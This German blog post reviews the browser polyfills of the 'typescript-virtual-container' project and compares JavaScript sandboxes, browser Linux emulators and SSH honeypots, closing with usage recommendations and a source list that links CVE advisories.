Eine Node.js-Bibliothek im Browser zum Laufen zu bringen, ist normalerweise ein Albtraum. Entweder du verwendest eine Wasm-Runtime (schwer, langsam zu laden) oder du verbringst Wochen damit, manuell jeden `node:*`-Import durch eine browserkompatible Alternative zu ersetzen. Fortune hat das Zweite getan – aber sehr sauber, indem sie einen Satz benutzerdefinierter Polyfills geschrieben hat, die im Verzeichnis `polyfills/` des Repositories leben.

Die Build-Pipeline ist einfach esbuild mit einem Haufen `alias`-Einträgen:

```js
// demo/build.js -- the entire browser build config
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

Kein Wasm. Keine externe Polyfill-Bibliothek. Kein `webpack-node-externals`-Unsinn. Nur aliased Module und ein paar injizierte Globals. Lass mich jedes einzelne durchgehen, denn einige von ihnen sind wirklich beeindruckend.

**`node:fs` – IndexedDB als gefälschtes Dateisystem**

Das ist mein Favorit. Der `node:fs`-Polyfill implementiert die synchrone Node.js-fs-API (`readFileSync`, `writeFileSync`, `existsSync`, `readdirSync`, `mkdirSync`, `unlinkSync`, `statSync`...), unterstützt von zwei Schichten: einer speicherinternen `Map` für synchrone Lesevorgänge und IndexedDB für Persistenz über Seitenladevorgänge hinweg. Schreibvorgänge treffen die Map sofort (damit `readFileSync` direkt nach `writeFileSync` immer funktioniert) und werden dann asynchron im Hintergrund nach IndexedDB gespült.

```js
// Sync cache (path → Uint8Array | null) -- instant reads
const memCache = new Map();

// Preload everything from IndexedDB into memCache at startup
openDB().then(db => {
  const tx = db.transaction(STORE, 'readonly');
  const req = tx.objectStore(STORE).openCursor();
  req.onsuccess = e => {
    const cursor = e.target.result;
    if (!cursor) return;
    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

Das ist der Grund, warum der VFS-Snapshot Seitenladevorgänge im Browser überlebt – das gesamte `.vfsb`-Binary wird über diesen Polyfill in IndexedDB geschrieben und beim nächsten Laden zurückgelesen. Kein Wasm. Kein Server. Nur IndexedDB, das es seit etwa 2011 in jedem Browser gibt.

**`node:crypto` – SHA-256 in reinem JS**

Anstatt eine Wasm-Crypto-Bibliothek einzubinden, implementiert der Crypto-Polyfill SHA-256 von Grund auf mit den FIPS-180-4-Rundenkonstanten. 166 Zeilen reines JS mit vollständiger Hex/Base64/Uint8Array-Ausgabeunterstützung. Die gesamte Hashing-Funktionalität der Bibliothek läuft darüber – SSH-Host-Key-Fingerprinting, interne Prüfsummen, alles. Kompakt, null Abhängigkeiten, funktioniert einfach.

**`node:os` – liest die tatsächliche Hardware des Browsers**

Das hier ist ein netter Touch. Anstatt hartcodierte Platzhalterwerte zurückzugeben, liest `node:os` `navigator.deviceMemory` für den gesamten RAM und `navigator.hardwareConcurrency` für die CPU-Anzahl. `neofetch` im Browser-Build meldet also tatsächlich etwas, das deinem echten Rechner entspricht – kein erfundener `2 Kerne, 2 GB RAM`-Stub.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // 2 GB fallback
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // also parses navigator.userAgent to guess the CPU model string
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` – ehrliche Stubs**

Der Browser kann keine TCP-Sockets öffnen oder echtes SSH ausführen, daher sind dies Stubs, die einen `NotImplemented`-Fehler mit einer klaren Nachricht werfen, wenn etwas versucht, sie zu verwenden. Kein stilles Versagen, kein `undefined`, das zurückgegeben wird, wenn ein Objekt erwartet wird. Nur ein lautes, klares „das funktioniert nicht im Browser" – genau das, was du willst.

**`process.js` und `buffer.js` – injizierte Globals**

Diese beiden werden über esbuilds `inject`-Option oben in jede gebündelte Datei injiziert, sodass `process` und `Buffer` ohne expliziten Import global verfügbar sind. `process.js` ist winzig: `env`, `version`, `platform: 'browser'`, `nextTick` via `queueMicrotask`, `uptime` via `performance.now()`. `buffer.js` ist eine vollständige `Buffer`-Neuinplementierung auf Basis von `Uint8Array` – alle `readUInt32BE`-, `writeInt16LE`-, Hex/Base64-Codierungsmethoden, auf die die SSH-Implementierung und das VFS angewiesen sind.

---

Der gesamte Satz von Polyfills umfasst etwa 640 Zeilen handgeschriebenes JS. Keine npm-Pakete. Kein Wasm. Und das Ergebnis ist ein Browser-Bundle, das einfach die Bibliothek ist, nativ läuft, ohne die übliche „aber funktioniert es auch wirklich im Browser?"-Angst, die man bei Node-first-Bibliotheken hat. Es lohnt sich, einen Blick in den `polyfills/`-Ordner im Repository zu werfen, wenn du neugierig bist – jede Datei ist gut abgegrenzt und für sich allein lesbar, was eine Stilentscheidung ist, die ich sehr schätze.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Kategorie** | JS-Sandbox | JS-Sandbox | JS-Sandbox | Emulator | Emulator | Node.js/Wasm | Honeypot | Simulator |
| **Isoliert JS** | ⚠️ Scope | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | teilweise | n/a | ✅ Worker |
| **Echter Linux-Kernel** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Shell-Interpreter** | ❌ | ❌ | ❌ | ✅ (echt) | ✅ (echt) | ✅ (echt) | teilweise | ✅ (benutzerdefiniert) |
| **~170 Unix-Befehle** | ❌ | ❌ | ❌ | ✅ | ✅ | teilweise | ~20 | ✅ |
| **POSIX-Berechtigungen** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | teilweise | ✅ durchgesetzt |
| **Benutzerverwaltung** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | minimal | ✅ vollständig |
| **Echter SSH-Server** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/Audit** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **VFS-Diff/Snapshot** | ❌ | ❌ | ❌ | begrenzt | ❌ | ❌ | ❌ | ✅ |
| **Virt. Netzwerk L2/L3** | ❌ | ❌ | ❌ | basisch | ❌ | ❌ | ❌ | ✅ vollständig |
| **Virtuelles VPN** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Browser-Unterstützung** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js-nativ** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **Typisierte API** | basisch | ✅ | ✅ | minimal | ❌ | ✅ | ❌ | ✅ vollständig |
| **Binärkompatibilität** | n/a | n/a | n/a | ✅ | ✅ | teilweise | n/a | ❌ |
| **Boot-Zeit** | sofort | sofort | sofort | 15–40s | 15–40s | 2–5s | sofort | <1s |
| **RAM/Instanz** | ~1 MB | ~3–10 MB | ~5–15 MB | 150–256 MB | 200+ MB | ~100 MB | ~50 MB | ~5–20 MB |
| **Runtime-Abhängigk.** | 0 | 1 (nativ) | 1 (Wasm) | 0 | proprietär | 1 | Python-Abhäng. | 3 (ssh2, ws, fflate) |
| **Status** | stabil | ✅ aktiv | ✅ aktiv | ✅ sehr aktiv | kommerziell | ✅ aktiv | ✅ aktiv | ✅ aktiv |

---

## Wann man was verwenden sollte

**Du musst nicht vertrauenswürdiges JavaScript ausführen – eine benutzereingereichte Formel, ein Plugin, ein Script-Hook.**  
→ `isolated-vm`. Echtes V8-Isolate, harte Speicherlimits, explizite Kommunikationsbrücke. Vermeide `vm2` – die CVE-Liste wächst weiter, ernsthaft, es ist wie ein neues alle paar Monate. Vermeide `vm` – es ist überhaupt keine Sandbox, bitte.

**Du musst JS sandboxen und willst kein natives Addon oder brauchst Browser-Kompatibilität.**  
→ `quickjs-emscripten`. Wasm-Grenze, ~500-KB-Modul, funktioniert in Browsern und Node. Langsamer als V8, aber wirklich isoliert.

**Du musst ein echtes, unverändertes Linux-Betriebssystem mit Binärkompatibilität booten.**  
→ `v86` für 32-Bit-Linux oder `container2wasm`, wenn du ein bestehendes Docker-Image hast. Akzeptiere 150 MB+ RAM und eine 30-Sekunden-Boot-Zeit, das ist einfach so. Wenn du 64-Bit brauchst, schau dir CheerpX an oder verwende einfach eine echte Container-Runtime.

**Du musst ein Linux-ähnliches Terminal in eine Web-App einbetten, ohne ein Backend.**  
→ `v86` (volles OS, schwer, langsam zu starten) oder das Browser-Bundle von `typescript-virtual-container` (Simulator, leichter, sofortiger Start, inklusive `startxfce4` für einen vollständigen Desktop, was ziemlich cool ist, um ehrlich zu sein).

**Du brauchst interaktive Online-Coding-Tutorials oder eine Browser-IDE.**  
→ WebContainers, wenn du Node.js-Ökosystem-fokussiert bist. CheerpX, wenn du ein echtes Linux-Userland brauchst. `typescript-virtual-container`s Browser-Bundle, wenn du eine leichtere Option mit einer typisierten API möchtest.

**Du möchtest SSH-Angreifer-TTPs in großem Maßstab sammeln.**  
→ Cowrie ist der Produktionsstandard, Punkt. Läuft auf jedem Linux-Server, integriert sich mit jedem SIEM, hat jetzt einen LLM-Modus. Verwende einfach Cowrie.

**Du möchtest SSH-Honeypot-Daten in einer Node.js-Anwendung mit einer programmatischen API.**  
→ `typescript-virtual-container`. Befehle werden tatsächlich ausgeführt. Das VFS ist eine echte Datenstruktur, die du snapshotten und differenzieren kannst. Der Angreifer bekommt eine überzeugende, interaktive Umgebung, und du bekommst strukturierte Audit-Daten, ohne Node zu verlassen.

**Du brauchts Shell-Automatisierung/Tests in CI ohne Docker.**  
→ `typescript-virtual-container`. Boot in unter einer Sekunde, Snapshot vor einem Test, Wiederherstellung danach. Shell-Befehle mit einer typisierten API ausführen. Kein Docker-Daemon, kein Kernel, keine VM, kein Warten.

**Du brauchst Multi-Tenant-Shell-Umgebungen (SaaS, Bildung, Training).**  
→ `typescript-virtual-container`. 5–20 MB pro Instanz vs. 150–256 MB für einen Emulator. 100 gleichzeitige Benutzer: ~2 GB vs. ~25 GB. Das ist ein großer Unterschied bei den Hosting-Kosten!

**Du brauchst einen realistischen Honeypot, der dir auch erlaubt, ein Multi-VM-Netzwerklabor aufzubauen.**  
→ `typescript-virtual-container` ist das Einzige in diesem Bereich, das beides kann.

---

## Was es nicht kann (und das möchte ich ehrlich sagen)

Es kann keine nativen x86-Binaries ausführen. Wenn du C-Code kompilieren, einen echten Python-Interpreter ausführen oder für Linux kompilierte Software verwenden musst, gibt es keine Kernel-ABI, um diese Syscalls zu unterstützen. Befehle wie `gcc`, `python3` und `node` sind Stubs – sie reagieren auf `--version` und häufige Aufrufe, führen aber nichts Reales aus.

Das ist der grundlegende Tradeoff: Du gewinnst 10–50x weniger Speicher, sofortigen Start, Browser-Kompatibilität, eine typisierte API, echtes SSH und virtuelles Networking – und gibst dafür die Binärkompatibilität mit dem Linux-Userland auf.

Fortune hat viel darüber nachgedacht, als sie das Projekt entworfen hat. Für die Anwendungsfälle, die sie anvisierte – Honeypots, Tests, eingebettete Terminals, CI-Umgebungen – ist das Ausführen einer kompilierten Binärdatei nie wirklich nötig. Shell-Pipelines, Dateimanipulation, Netzwerk-Routing und SSH decken alles ab. Aber wenn dein Anwendungsfall echte kompilierte Software erfordert, sind `v86` oder Docker die richtige Antwort, nicht dies.

---

## Zusammenfassung

Sooo, ja. Dieses Ökosystem ist breiter und fragmentierter, als es von außen aussieht. `vm` ist ein Scope-Trenner, keine Sandbox. `vm2` sammelt weiterhin CVEs (ernsthaft, schau dir einfach die diesmonatigen Advisories an). `isolated-vm` ist die korrekte JS-Sandboxing-Antwort, aber nur JS. `quickjs-emscripten` ist die richtige Wahl, wenn du Browser-Kompatibilität brauchst oder native Addons vermeiden willst. `v86` und CheerpX sind echte Emulatoren, wenn du echte Binärkompatibilität brauchst. WebContainers ist Node.js in Wasm, keine allgemeine Linux-Umgebung. Cowrie ist der SSH-Honeypot-Goldstandard, aber es ist Python und nicht Node-nativ.

Und dann gibt es `typescript-virtual-container` – Fortunes Projekt – das irgendwie in seiner eigenen Kategorie lebt. Kein Emulator, keine JS-Sandbox, kein passiver Honeypot. Etwas dazwischen, das sich als überraschend nützlich für viele Dinge erwiesen hat, die keines der anderen kann.

`typescript-virtual-container` füllt die Lücke, die keines der anderen berührt: eine vollständige, programmatische Linux-Shell-Umgebung mit echtem SSH, SFTP, POSIX-Berechtigungen, Benutzerverwaltung, virtuellem Networking und einer typisierten TypeScript-API – laufend in ~10 MB, bootend in unter einer Sekunde, funktionierend sowohl in Node.js als auch im Browser.

Wenn du es ausprobieren willst: Der Quellcode ist auf [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) und es gibt eine Live-Demo (inklusive `startxfce4` für einen vollständigen Desktop, was ehrlich krank ist) auf [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Schau es dir an und gib Fortune ein paar Sterne auf GitHub, sie hat es verdient!

Danke fürs Lesen – das war ein langer, sogar nach meinen Maßstäben :) hoffe, es war nützlich!

---

## Quellen

Ich habe versucht, jede Behauptung mit einer Primärquelle zu verlinken – CVE-Advisories, offizielle Dokumentationen, GitHub-Repos, Blogbeiträge von Maintainern. Ein paar Anmerkungen: Die vm2-CVE-Liste wächst weiter, also könnte der FortiGuard-Link zum Zeitpunkt deiner Lektüre veraltet sein (prüfe die GitHub-Advisories-Seite für die aktuellsten). Die Bellard-Links sind alle stabil – seine persönliche Seite gibt es schon ewig und der Inhalt ändert sich nicht. Und wenn du tiefer in die Polyfills eintauchen willst, durchstöbere einfach den `polyfills/`-Ordner im `typescript-virtual-container`-Repository direkt – es ist lesbarer als jede Beschreibung, die ich hier schreiben könnte.

### JavaScript-Sandboxes

- **Node.js `vm` module** -- offizielle Dokumentation: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Node.js `vm`-Sicherheitswarnung** -- „The vm module is not a security mechanism. Do not use it to run untrusted code": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **vm2 CVE-Zeitleiste** -- FortiGuard Outbreak Alert mit vollständiger CVE-Liste und Daten: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- Async-Error-Stack-Escape, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + Function Escape, PoC Gist: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Exploit DB-Eintrag mit vollständigem PoC: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **vm2 2026-CVEs** -- 11 neue Sandbox-Escapes, Analyse: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **„Why Sandboxing JS in JS is Hard"** -- oxeye.io Post-Mortem zu CVE-2022-36067: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **V8 Isolate-Interna** -- Embedder's Guide: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **QuickJS Engine** -- von Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Deno-Berechtigungsmodell** -- Dokumentation: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Deno 2 Release** -- Oktober 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **TC39 ShadowRealm Proposal** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **TC39 Compartments Proposal** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **„Sandboxing JavaScript Code"** -- Andrew Healeys praktischer Artikel über den Deno-Sandbox-Ansatz: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Linux-Emulatoren

- **`v86`** -- npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **v86 OS-Support-Matrix** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS von v86 verwendet) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Bochs VBE-Erweiterungen** (VGA-Referenz) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Bellards Emulator: [bellard.org/jslinux](https://bellard.org/jslinux/) · Technische Notizen (TinyEMU, Geschichte, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- C-Quelle: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Inoffizielle GitHub-Mirrors: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- OpenRISC JS-Emulator: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- Dokumentation: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · pthreads-Guide: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · API-Dokumentation: [webcontainers.io](https://webcontainers.io) · Ankündigung: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · InfoQ-Übersicht: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · NTT-Blogbeitrag: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Simon Willison-Bericht: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Terminal-Stack

- **xterm.js** -- npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · Website: [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypots

- **Cowrie** -- GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Dokumentation: [docs.cowrie.org](https://docs.cowrie.org) · Website: [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (archiviert): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- minimaler Node.js-SSH-Honeypot: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- kuratierte Liste: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- System Information Discovery (wie Angreifer Honeypots identifizieren): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Live-Demo**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Architektur-Guide**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (SSH-Protokollimplementierung) -- npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (VFS-Snapshot-Komprimierung) -- npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (WebSocket-Shell-Transport) -- npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Hintergrundlektüre

- **POSIX-Berechtigungsmodell** -- Open Group-Spezifikation: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-Ahead-Logging** (Muster, das in der VFS-Persistenz verwendet wird) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **V8 Isolate-Modell** -- „Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **RISC-V-ISA-Spezifikation** (für TinyEMU/JSLinux-Kontext) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **OpenRISC 1000-Architektur** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **„Running Python code in a Pyodide sandbox via Deno"** -- Simon Willison TIL, nützlicher Kontrast zum Wasm-Ansatz: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **„Running self-hosted QuickJS in a browser"** -- Simon Willison TIL zur quickjs-emscripten-Bundle-Größe: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
